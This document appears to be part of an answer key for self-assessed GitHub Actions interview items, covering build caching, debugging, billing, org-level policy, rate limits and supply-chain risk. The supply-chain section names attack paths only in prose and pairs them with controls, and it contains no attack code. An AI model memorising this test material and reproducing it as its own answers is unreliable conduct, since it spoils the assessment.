- uses: docker/setup-buildx-action@v3
- uses: docker/build-push-action@v6
  with:
    push: true
    tags: ghcr.io/acme/api:${{ github.sha }}
    cache-from: type=gha
    cache-to: type=gha,mode=max
```

**The options, and choosing between them is the item:**

- **`type=gha`** — uses the GitHub Actions cache backend. **Convenient, and it consumes the repository's 10GB cache budget** (GA9.3), which a `mode=max` cache can exhaust on its own. **Best for small-to-moderate images.**
- **`type=registry`** — stores the cache in a container registry (D3.5):
  ```yaml
  cache-from: type=registry,ref=ghcr.io/acme/api:buildcache
  cache-to: type=registry,ref=ghcr.io/acme/api:buildcache,mode=max
  ```
  **Not subject to the Actions cache limit**, portable across runners and repositories, and **it costs registry storage** (D8.5). **The better choice for large images.**
- **`type=inline`** — the cache is embedded in the pushed image. Simple, and **only `mode=min`**, so intermediate layers aren't cached.
- **`type=local`** with `actions/cache` — more manual, and it needs a move step to avoid unbounded growth.

**`mode=max` vs `mode=min`**: **max exports intermediate stage layers too**, giving much better hit rates for multi-stage builds (D3.1) at the cost of a larger cache. **For a multi-stage build, `mode=max` is usually worth it.**

**The other essentials**: **`docker/setup-buildx-action` is required** — the default Docker driver doesn't support these cache exporters, and omitting it means the cache options are silently ignored. **And the Dockerfile must be ordered for cache efficiency** (D2.6) — layer caching in CI can't help a Dockerfile that copies source before installing dependencies.

---

## GA10. Operations & judgement

**GA10.1 — Debugging a workflow efficiently**

**The techniques, roughly in order of what to try:**

1. **Read the logs and annotations properly** (GA1.7) — the failed step is expanded, and annotations surface on the summary.
2. **Enable debug logging** — set repository secrets or variables `ACTIONS_STEP_DEBUG: true` and `ACTIONS_RUNNER_DEBUG: true`, then re-run. **Verbose output including the runner's internal decisions**, and it's the first escalation.
3. **Re-run with debug logging** from the UI — the "Re-run jobs" menu has an "Enable debug logging" checkbox, which avoids setting the secret.
4. **Dump the context** — `echo '${{ toJSON(github) }}'` (GA4.3) shows exactly what the event payload contains, which resolves most expression problems immediately.
5. **`act`** — run workflows locally in Docker. **Fast iteration, and it's an approximation** — the runner image differs, some features are unsupported, and secrets and OIDC behave differently. **Good for syntax and logic; not a substitute for a real run.**
6. **`tmate`** (`mxschmitt/action-tmate`) — opens an SSH session into the runner mid-job. **Extremely effective for "it works locally and not in CI"**, and it's a security consideration: **never on a public repository**, and gate it behind a condition so it doesn't run routinely.
7. **A minimal reproduction** — a separate workflow with just the failing step, iterated on a branch. **Faster than re-running a 20-minute pipeline.**
8. **`actionlint`** — static analysis catching syntax errors, invalid contexts (GA4.2), shellcheck issues in `run` blocks, and **script injection patterns** (GA4.9). **Worth running in CI on the workflows themselves.**

**The general discipline**: **shorten the feedback loop.** A 20-minute pipeline debugged by pushing commits is intolerable; **a minimal workflow on a branch, or `act` locally, turns it into seconds.**

**GA10.2 — Diagnosing a flaky workflow**

**The Actions-specific causes** (C2.8 covers the general ones):

- **Runner image changes** — `ubuntu-latest` moved and a pre-installed tool version changed. **A build failing with no code change is frequently this**, and the runner image changelog is where you check.
- **Network flakiness** — package registry timeouts, Docker Hub rate limits (D8.7), or an external API.
- **Cache non-determinism** — a partial restore giving a different starting state (GA9.4).
- **Concurrency and shared resources** — matrix legs or parallel runs contending on a shared test database or a shared cloud resource (GA3.7's `max-parallel`).
- **Timing** — a service container not ready (GA3.12's health checks), or a test with a sleep-based assumption.
- **Resource exhaustion** — the 14GB disk or 16GB RAM limit hit intermittently under a heavier test load. **`df -h` and `free -m` in a debug step** identifies it.
- **Self-hosted runner state** (GA8.5) — a persistent runner accumulating state that affects some runs.

**Stabilising:**

1. **Measure which jobs and steps fail intermittently** — the Actions API or a third-party dashboard, because GitHub's UI doesn't aggregate this well.
2. **Pin the runner image** (`ubuntu-22.04`) to remove that variable, accepting the staleness tradeoff.
3. **Retry deliberately at the right level** — `nick-fields/retry` for a genuinely transient network step. **Never retry a test until it passes** (C4.4).
4. **Isolate** — ephemeral runners, per-run test data, unique resource names.
5. **Add health checks** for service containers (GA3.12).
6. **Quarantine flaky tests** with an owner (C4.4).

**GA10.3 — Billing: minutes, multipliers, storage**

**The model:**

- **Public repositories: free** for GitHub-hosted standard runners.
- **Private repositories: an included minute allowance per plan**, then per-minute charges.
- **Multipliers**: **Linux ×1, Windows ×2, macOS ×10.** **Rounded up to the nearest minute per job.**
- **Larger runners** are billed at their own higher rates and **do not use the included minutes** — they're always charged.
- **Storage** for artifacts and packages, billed per GB-month beyond the allowance (GA9.6).
- **Self-hosted runners consume no Actions minutes** — you pay the infrastructure directly.

**How costs escalate, which is the item's focus:**

- **The macOS multiplier.** A test matrix including macOS costs 10× per minute. **A 5-minute macOS job across a 6-leg matrix on every PR is the single most common cost surprise.**
- **Per-job minute rounding** — a workflow split into twenty 30-second jobs bills twenty minutes, not ten. **Many small jobs are expensive** (GA1.3's overhead argument, now with a cost).
- **Matrix multiplication** — every leg is a separate billed job.
- **Frequent triggers** — a workflow on every push to every branch, plus every PR synchronise.
- **Long-running or hung jobs** without a timeout (GA3.10) — up to 6 hours each.
- **Storage accumulating** silently (GA9.6).

**GA10.4 — Reducing cost and duration with evidence**

**The method:**

1. **Measure first** — per-workflow and per-job minutes from the billing page and the API; **duration and queue time** (C2.10); and which workflows run most often.
2. **Identify the concentration** — cost and duration are heavily concentrated, so **a handful of workflows are usually most of it.**
3. **Apply the levers in order of impact:**

| Lever | Typical impact |
|---|---|
| **Concurrency cancelling superseded PR runs** (GA3.9) | **Large** — often 20–30% of wasted minutes |
| **Path filters** so workflows don't run on irrelevant changes (GA2.2) | Large in a monorepo |
| **Move macOS/Windows legs off the PR path** to nightly | **Very large** if present (GA10.3) |
| **Caching** dependencies and Docker layers (GA9.1, GA9.7) | Large on duration |
| **Combine tiny jobs** to avoid per-job overhead and rounding | Moderate |
| **Parallelise the critical path** (GA3.1) | Moderate on duration, not cost |
| **Shorter artifact retention** (GA9.6) | Storage cost |
| **Job timeouts** (GA3.10) | Prevents runaway cost |
| **Self-hosted or larger runners** where the arithmetic favours it (GA8.8) | Varies |

4. **Re-measure and report with a baseline** (C2.11, O13.10).

**A credible report:**

> "Actions spend was 42,000 minutes/month, 60% from one repository. The breakdown showed macOS test legs on every PR at 10× multiplier accounting for 18,000 of those. Moving macOS to a nightly run and keeping Linux on PRs cut it to 9,000 minutes, saving roughly £X/month, and PR feedback time dropped from 14 minutes to 6. We kept full-matrix coverage by running the complete matrix nightly and on release branches."

**GA10.5 — Enforcing org-level policies**

**Organisation Settings → Actions:**

- **Allowed actions** (GA5.9) — the allowlist. **The most important one.**
- **Default `GITHUB_TOKEN` permissions** — **set to read-only org-wide** (GA6.4). **A single setting with disproportionate value.**
- **Allow Actions to create and approve pull requests** — **disable this**, or a workflow can approve its own PR and bypass review (C10.1).
- **Fork PR workflow approval** — require approval for all outside collaborators, not just first-time contributors.
- **Self-hosted runner groups** and their repository access policies (GA8.3).
- **Artifact and log retention** defaults (GA9.6).
- **Which repositories may use Actions** at all.

**Beyond settings:**

- **Required workflows via rulesets** — enforce that a security scan or a policy check runs on every repository, defined centrally and not editable by the repository.
- **Organisation-level rulesets** for branch protection, applied across repositories rather than configured per repository.
- **CODEOWNERS on `.github/workflows/`** requiring platform-team review of workflow changes (C10.1) — **which closes the "anyone who can merge can change the pipeline" gap.**
- **A scanning workflow** checking for unpinned actions (GA5.2), `pull_request_target` misuse (GA2.4), and injection patterns (GA4.9) — `actionlint` and CodeQL cover these.

**The rollout advice**: **audit before enforcing** (A1.11) — the allowlist and the token permission change will break workflows, so measure the impact first and communicate.

**GA10.6 — Rate limits and API throttling**

**The limits that bite in workflows:**

- **`GITHUB_TOKEN`: 1,000 API requests per hour, per repository, per workflow run.** **A workflow looping over many resources exhausts this**, and the failure is a 403 with a rate-limit message.
- **The GitHub REST API generally**: 5,000/hour for an authenticated user; **15,000/hour for a GitHub App installation** (GA6.8) — **which is one reason to use an App for API-heavy work.**
- **Secondary rate limits** — concurrent request limits and abuse-detection throttling, which trigger on bursty patterns even under the primary limit. **These produce confusing intermittent failures.**
- **Docker Hub pull limits** (D8.7) — **shared across GitHub's runner IP ranges**, so anonymous pulls fail unpredictably. **Authenticate, or use GHCR or a pull-through cache.**
- **Package registry and external API limits.**

**The handling:**

- **Check `x-ratelimit-remaining`** in responses and back off.
- **Retry with exponential backoff and jitter** (O15.10) — and **don't retry immediately**, which makes secondary limits worse.
- **Reduce API calls** — batch with GraphQL rather than looping REST calls; use the event payload rather than re-fetching what's already in `github.event`.
- **Use an App token** for higher limits (GA6.8).
- **Authenticate Docker Hub pulls** or avoid it entirely.
- **`max-parallel`** to reduce burst concurrency (GA3.7).

**GA10.7 — Actions as a supply chain surface**

**The exposure** (S7.1, C10.4): **every action is arbitrary code executing in an environment with secrets, cloud credentials, and repository write access.** And most workflows use several, from third parties, referenced by a mutable tag.

**The attack paths:**

- **A compromised action** — the maintainer's account taken over, tags repointed (GA5.2). **`tj-actions/changed-files`, March 2025**: thousands of repositories affected within hours, secrets dumped into logs.
- **A malicious action** published to the marketplace, or a typosquat of a popular one.
- **A transitive action** — an action that itself uses other actions.
- **A dependency with an install script** in the workflow's own build (S7.1).
- **Script injection** from untrusted event data (GA4.9).
- **`pull_request_target` misuse** (GA2.4).
- **A self-hosted runner** on a public repository (GA8.4).
- **Cache poisoning** (C2.4).

**The controls, which is what the answer should land on:**

| Control | Addresses |
|---|---|
| **Pin actions to SHA** (GA5.2) | Tag repointing — **the highest-value single control** |
| **Org allowlist** (GA5.9) | Unvetted actions entering the environment |
| **Read-only default token** (GA6.4) | Blast radius of any compromise |
| **OIDC, no stored cloud secrets** (GA6.5) | Nothing to exfiltrate |
| **Environment-scoped secrets with approval** (GA7.4) | Production credentials unavailable to arbitrary workflows |
| **`pull_request` not `pull_request_target`** (GA2.3) | Untrusted code with privileges |
| **Ephemeral runners** (GA8.5) | Persistence |
| **Egress restrictions** on self-hosted runners | Exfiltration |
| **`actionlint` / CodeQL in CI** | Injection patterns |

**GA10.8 — Comparing Actions to Jenkins and others honestly**

| | GitHub Actions | Jenkins | GitLab CI | Others (Buildkite, CircleCI) |
|---|---|---|---|---|
| Hosting | SaaS (or self-hosted runners) | **Self-hosted** | Both | Usually hybrid |
| Config | YAML in the repo | Jenkinsfile (Groovy) or UI | YAML in the repo | YAML in the repo |
| Ecosystem | **Huge marketplace** | **Huge plugin ecosystem** | Smaller, built-in | Moderate |
| Setup cost | **Near zero** | **High** — you operate it | Low | Low |
| Extensibility | Actions (constrained model) | **Very high** — plugins, Groovy | Moderate | Moderate |
| Secrets/OIDC | **Strong, modern** | Plugin-dependent | Good | Good |

**Where Actions is genuinely better:**

- **Zero setup and zero operations** for the hosted model.
- **Tight GitHub integration** — PR checks, environments, deployments, and the permission model are native rather than bolted on.
- **Modern security defaults** — OIDC (GA6.5), scoped tokens (GA6.4), environment gates (GA7.1). **Jenkins's equivalent requires plugins and configuration.**
- **The marketplace** for common tasks.

**Where Actions is genuinely worse — and being able to say this is what makes the answer honest:**

- **Complex orchestration.** Jenkins's Groovy pipelines can express things Actions' YAML cannot — dynamic stage generation, complex shared libraries, intricate conditional flows. **Actions' expression language is deliberately limited** (GA4.3), and complex logic ends up in shell scripts.
- **Reusability is weaker.** Composite actions and reusable workflows have real limits (GA5.6); Jenkins shared libraries are more powerful.
- **You're tied to GitHub.** Migrating away means rewriting everything.
- **Debugging is harder** — no local execution that's fully faithful (GA10.1), and iteration means pushing commits.
- **Cost at scale** for private repositories, particularly with macOS or Windows (GA10.3).
- **Less control** over the execution environment on hosted runners.

**The honest summary**: **Actions wins decisively on setup cost, integration, and security defaults; Jenkins wins on flexibility and control.** For a team already on GitHub building typical services, Actions is the right default. For complex, heterogeneous, or on-premises estates, Jenkins's flexibility may still be worth its operational cost.

**GA10.9 — When Actions is the wrong tool**

- **Not on GitHub.** Obvious, and worth stating — the integration is the main value, and without it the case weakens considerably.
- **Complex orchestration** that YAML expresses badly (GA10.8) — long conditional flows, dynamic pipeline generation, intricate fan-out/fan-in. **You end up with shell scripts wrapped in YAML, which is worse than a purpose-built pipeline language.**
- **Long-running jobs** exceeding the 6-hour limit — a large data migration, a long soak test. **Trigger an external system instead** (a Step Functions workflow, a batch job) and have Actions poll or receive a callback.
- **Continuous deployment reconciliation.** **Actions is push-based; GitOps is pull-based** (K10.7). **For Kubernetes deployment, ArgoCD or Flux is the better model** — no cluster credentials in CI, continuous drift correction, and a clearer separation between build and deploy. **Actions builds the image and updates the manifest; the cluster does the rest.**
- **Scheduled work needing reliable timing** (GA2.9) — use a real scheduler.
- **Very high volume** where per-minute costs dominate and self-hosted operations aren't wanted.
- **As a general-purpose automation platform** — Actions is a CI/CD tool. Using it as a cron server, an ETL orchestrator, or an event processor works and is fragile: no retries beyond the job, no state, poor observability, and rate limits (GA10.6).
- **Where strict data residency applies** (S10.4) — hosted runners are where GitHub puts them.

**The framing**: **Actions is excellent at "run these steps in response to a repository event".** The further you get from that shape, the more you're fighting it — and the honest answer is frequently "use Actions to trigger the right tool" rather than to be the tool.

---

## Using this key

- **Score against the matrix first, then read only the items you scored 0 or 1.** At 88 items this is one of the smaller domains, and much of GA1–GA3 will be familiar if you've written workflows.
- **The two highest-consequence items are GA2.3/GA2.4 (`pull_request_target`) and GA4.8/GA4.9 (script injection).** Both are specific, exploitable, present in a large number of real repositories, and fixable in a couple of lines. **They come up in any security-aware interview** and knowing both the mechanism and the remedy is a strong signal.
- **GA6 is where an AWS platform role concentrates.** OIDC with a correctly-scoped trust policy (GA6.5, GA6.6) is the single most valuable thing here for your target roles, and **GA6.7's severity ladder** — from no `sub` condition at all down to environment-scoped — is worth being able to walk from memory.
- **The currency signals**: `$GITHUB_OUTPUT` rather than the disabled `::set-output::` (GA4.5); `actions/upload-artifact@v4`'s immutability change (GA9.5); the read-only `GITHUB_TOKEN` default for new organisations (GA6.4); ARC for Kubernetes runners (GA8.6); and the `tj-actions` compromise as the concrete argument for SHA pinning (GA5.2).
- **The mechanisms that read as experience**: `pipefail` not being enabled by default in bash steps (GA1.5); `github.sha` being a merge commit on `pull_request` events (GA1.6); `GITHUB_TOKEN` pushes not triggering workflows (GA2.11); a path-filtered workflow blocking a required status check forever (GA2.2); and cache branch scoping meaning feature branches build cold unless `main` populates the cache (GA9.2).
- **Cross-references are dense into CI/CD and Security** — C2 for pipeline design, C10 for governance, S7.9–S7.11 for supply chain, and A2.8 for the AWS side of OIDC. This domain is the tool; those are the practice.
